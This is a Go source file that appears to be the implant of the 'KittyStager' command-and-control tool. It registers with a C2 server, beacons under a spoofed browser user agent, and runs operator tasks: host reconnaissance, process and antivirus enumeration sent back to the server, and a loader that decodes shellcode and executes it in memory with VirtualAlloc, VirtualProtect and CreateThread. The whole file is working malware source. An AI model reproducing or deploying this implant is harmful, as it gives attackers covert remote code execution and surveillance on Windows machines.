package main

import (
	"KittyStager/kitten/malware"
	"encoding/hex"
	"fmt"
	"golang.org/x/sys/windows"
	"strconv"
)

var (
	name     string
	password string
	key      string
)

func main() {
	config := malware.NewConfig("http://127.0.0.1:8080",
		"getLegit",
		"postLegit",
		"reg",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/102.0",
		"",
		2,
	)
	name = malware.NewName(4)
	password = malware.NewPassword(10)
	err := malware.DoPwreg(name, password, *config)
	if err != nil {
		fmt.Println(err)
		return
	}
	key, err = malware.DoAuth(name, password, *config)
	if err != nil {
		fmt.Println(err)
		return
	}
	//get request
	config.SetCookie(name)
	for {
		t, err := malware.GetTask(*config, key)
		if err != nil {
			fmt.Println(err)
			return
		}
		switch t.Tag {
		case "recon":
			r, err := malware.DoRecon(key)
			if err != nil {
				fmt.Println(err)
				return
			}
			_, err = malware.PostRequest(r, config.PostEndpoint, *config)
			if err != nil {
				fmt.Println(err)
				return
			}
		case "ps":
			ps, err := malware.GetProcessList(key)
			if err != nil {
				fmt.Println(err)
				return
			}
			_, err = malware.PostRequest(ps, config.PostEndpoint, *config)
			if err != nil {
				fmt.Println(err)
				return
			}
		case "av":
			ps, err := malware.GetAV(key)
			if err != nil {
				fmt.Println(err)
				return
			}
			_, err = malware.PostRequest(ps, config.PostEndpoint, *config)
			if err != nil {
				fmt.Println(err)
				return
			}
		case "sleep":
			time, err := strconv.Atoi(string(t.Payload))
			if err != nil {
				fmt.Println(err)
				return
			}
			config.SetSleep(time)
		case "payload":
			shellcode, _ := hex.DecodeString(string(t.Payload))
			inject(shellcode)
		}

		fmt.Println(t.Tag)
		fmt.Println(t.Payload)
		fmt.Println(name)
		malware.Sleep(config.Sleep)
	}
}
func inject(shellcode []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	createThread := kernel32.NewProc("CreateThread")
	shellcodeExec, _ := windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)

	malware.Memcpy(shellcodeExec, shellcode)

	var oldProtect uint32
	windows.VirtualProtect(
		shellcodeExec,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect)

	hThread, _, _ := createThread.Call(
		0,
		0,
		shellcodeExec,
		uintptr(0),
		0,
		0)

	windows.WaitForSingleObject(
		windows.Handle(hThread),
		windows.INFINITE)
}
